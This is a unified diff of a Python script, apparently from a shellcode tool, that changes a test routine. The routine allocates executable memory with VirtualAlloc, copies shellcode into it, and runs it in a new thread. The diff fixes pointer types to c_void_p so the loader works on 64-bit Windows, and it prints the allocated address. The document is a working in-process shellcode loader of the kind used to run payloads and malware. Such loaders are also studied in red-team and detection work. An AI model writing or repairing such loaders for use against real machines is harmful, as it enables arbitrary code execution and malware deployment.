@@ -57,25 +57,27 @@ def main():
 
     # Run code in current process
     if args.test:
+        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
         ptr = ctypes.windll.kernel32.VirtualAlloc(
             ctypes.c_int(0),
             ctypes.c_int(len(code)),
             ctypes.c_int(0x3000),
             ctypes.c_int(0x40),
         )
+        print(ctypes.c_void_p(ptr))
         buf = (ctypes.c_char * len(code)).from_buffer(code)
         ctypes.windll.kernel32.RtlMoveMemory(
-            ctypes.c_int(ptr), buf, ctypes.c_int(len(code))
+            ctypes.c_void_p(ptr), buf, ctypes.c_int(len(code))
         )
         print("[=]   Shellcode located at address %s" % hex(ptr))
         input("...ENTER TO EXECUTE SHELLCODE...")
         ht = ctypes.windll.kernel32.CreateThread(
             ctypes.c_int(0),
             ctypes.c_int(0),
-            ctypes.c_int(ptr),
+            ctypes.c_void_p(ptr),
             ctypes.c_int(0),
             ctypes.c_int(0),
-            ctypes.pointer(ctypes.c_int(0)),
+            ctypes.pointer(ctypes.c_void_p(0)),
         )
         ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
 
